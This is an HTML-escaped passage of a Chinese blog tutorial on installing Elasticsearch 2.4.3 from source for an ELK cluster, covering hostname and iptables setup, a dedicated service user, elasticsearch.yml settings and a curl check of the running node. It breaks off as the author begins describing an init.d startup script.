&lt;h4 id=&quot;基本配置设置FQDN：&quot;&gt;&lt;a href=&quot;#基本配置设置FQDN：&quot; class=&quot;headerlink&quot; title=&quot;基本配置设置FQDN：&quot;&gt;&lt;/a&gt;基本配置设置FQDN：&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#修改hostname&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cat /etc/hostname&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;es_01&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#修改hosts&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cat /etc/hosts&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;::1 localhost localhost.localdomain localhost6 localhost6.localdomain6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10.47.88.206 es.ihaozhuo.com es_01&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#刷新环境&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;hostname -F /etc/hostname&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#复查结果&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;hostname &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;es.ihaozhuo.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;hostname&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;es_01&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;防火墙配置&quot;&gt;&lt;a href=&quot;#防火墙配置&quot; class=&quot;headerlink&quot; title=&quot;防火墙配置&quot;&gt;&lt;/a&gt;防火墙配置&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#service iptables stop&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#setenforce 0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;不过这里我防火墙是开启的，后期添加出去端口即可。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;或者可以不关闭防火墙，但是要在iptables中打开相关的端口：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# vim /etc/sysconfig/iptables&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-A INPUT -m state --state NEW -m tcp -p tcp --dport 9200 -j ACCEPT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-A INPUT -m state --state NEW -m tcp -p tcp --dport 9292 -j ACCEPT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# service iptables restart&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;RPM快速安装&quot;&gt;&lt;a href=&quot;#RPM快速安装&quot; class=&quot;headerlink&quot; title=&quot;RPM快速安装&quot;&gt;&lt;/a&gt;RPM快速安装&lt;/h4&gt;&lt;p&gt;elk所有安装都可以使用rpm二进制包的方式,增加&lt;code&gt;elastic官网&lt;/code&gt;的仓库repo就可以用yum安装了&lt;/p&gt;
&lt;p&gt;elasticsearch看这里 —– &lt;a href=&quot;https://www.elastic.co/guide/en/elasticsearch/reference/current/setup-repositories.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;elasticsearch-rpm官方文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;logstash看这里 —-&lt;a href=&quot;https://www.elastic.co/guide/en/logstash/current/installing-logstash.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;logstash-rpm官网文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;kibana看这里 —&lt;a href=&quot;https://www.elastic.co/guide/en/kibana/current/setup.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;kibana-rpm官网文档&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;es-01服务端源码安装&quot;&gt;&lt;a href=&quot;#es-01服务端源码安装&quot; class=&quot;headerlink&quot; title=&quot;es_01服务端源码安装&quot;&gt;&lt;/a&gt;es_01服务端源码安装&lt;/h3&gt;&lt;p&gt;这里我是源码安装的&lt;br&gt;下载ElasticSearch ElasticSearch默认的对外服务的HTTP端口是9200，节点间交互的TCP端口是9300。&lt;/p&gt;
&lt;p&gt;下载地址：&lt;a href=&quot;https://www.elastic.co/downloads/elasticsearch&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Elasticsearch&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2.4版本：&lt;br&gt;&lt;a href=&quot;https://www.elastic.co/downloads/past-releases/elasticsearch-2-4-3&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Elasticsearch2.4.3&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;解压源码包：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 ~]&lt;span class=&quot;comment&quot;&gt;# tar -zxvf elasticsearch-2.4.3.tar.gz -C /usr/local/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;然后给目录做个软链接：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 &lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;]&lt;span class=&quot;comment&quot;&gt;# ln -s  /usr/local/elasticsearch-2.4.3/ /usr/local/elasticsearch&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;这里需要修改配置文件：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;配置前先创建几个目录文件&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;新建目录, 假设/data/目录挂载的硬盘最大(500G以上)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 srv]]&lt;span class=&quot;comment&quot;&gt;# mkdir /srv/data/es-data -p&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 srv]&lt;span class=&quot;comment&quot;&gt;# mkdir /srv/data/es-work &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 &lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;]&lt;span class=&quot;comment&quot;&gt;# mkdir /usr/local/elasticsearch/logs&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 &lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;]&lt;span class=&quot;comment&quot;&gt;# mkdir /usr/local/elasticsearch/config/plugins&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;新建用户&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;修改源码目录属性属组：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 elasticsearch]&lt;span class=&quot;comment&quot;&gt;# useradd  -s /sbin/nologin elasticsearch&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 elasticsearch]&lt;span class=&quot;comment&quot;&gt;# chown -R elasticsearch:elasticsearch /usr/local/elasticsearch&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 elasticsearch]&lt;span class=&quot;comment&quot;&gt;# chown -R elasticsearch:elasticsearch /srv/data/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;切换用户&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;切换到elasticsearch用户, 并进入elasticsearch目录&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;su elasticsearch&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/elasticsearch/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;配置Elasticsearch：&quot;&gt;&lt;a href=&quot;#配置Elasticsearch：&quot; class=&quot;headerlink&quot; title=&quot;配置Elasticsearch：&quot;&gt;&lt;/a&gt;配置Elasticsearch：&lt;/h3&gt;&lt;p&gt;以用户es的身份进行操作&lt;/p&gt;
&lt;p&gt;文件路径: &lt;code&gt;config/elasticsearch.yml&lt;/code&gt;&lt;br&gt;修改该文件中配置项: (注意, 原始文件中都是被#号注释掉了, 需要去掉对应注释并修改配置值)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;集群名: cluster.name, 注意: 两台机器配置一致&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;cluster.name: elk_cluster&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;节点名: node.name, 注意: 两台机器配置不同, 一台为01, 另一台为02&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;# 第一台机器&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;node.name: inner_es_node_01&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 第二台机器&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;node.name: inner_es_node_02&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 config]&lt;span class=&quot;comment&quot;&gt;# vim elasticsearch.yml&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Use a descriptive name for your cluster:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cluster.name: elk_cluster&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ------------------------------------ Node ------------------------------------&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Use a descriptive name for the node:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;node.name: es_01&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Add custom attributes to the node:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# node.rack: r1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ----------------------------------- Paths ------------------------------------&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Path to directory where to store the data (separate multiple locations by comma):&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;path.data: /srv/data/es-data&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Path to log files:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;path.logs: /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/elasticsearch/logs&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ----------------------------------- Memory -----------------------------------&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Lock the memory on startup:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# bootstrap.memory_lock: true&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Make sure that the `ES_HEAP_SIZE` environment variable is set to about half the memory&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# available on the system and that the owner of the process is allowed to use this limit.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Elasticsearch performs poorly when the system is swapping the memory.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ---------------------------------- Network -----------------------------------&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Set the bind address to a specific IP (IPv4 or IPv6):&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;network.host: 10.47.88.206&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;切换到elasticsearch用户启动服务。&lt;/p&gt;
&lt;p&gt;源码安装启动需要执行 ：&lt;code&gt;/usr/local/elasticsearch/bin/elasticsearch &amp;amp;&lt;/code&gt;&lt;br&gt;才能启动；&lt;/p&gt;
&lt;h3 id=&quot;测试访问服务正常：&quot;&gt;&lt;a href=&quot;#测试访问服务正常：&quot; class=&quot;headerlink&quot; title=&quot;测试访问服务正常：&quot;&gt;&lt;/a&gt;测试访问服务正常：&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[elasticsearch@es_01 elasticsearch]$  curl http://10.47.88.206:9200&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;es_01&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;cluster_name&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;elk_cluster&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;cluster_uuid&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;mspLZT5nTL-d124suNbBBQ&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;version&quot;&lt;/span&gt; : &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;number&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;2.4.3&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;build_hash&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;d38a34e7b75af4e17ead16f156feffa432b22be3&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;build_timestamp&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;2016-12-07T16:28:56Z&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;build_snapshot&quot;&lt;/span&gt; : &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;lucene_version&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;5.5.2&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;tagline&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;You Know, for Search&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面是写开机启动脚本，不写的直接切换es用户到目录启动 -d后台启动。&lt;br&gt;这里需要/etc/init.d/创建启动脚本。&lt;/p&gt;
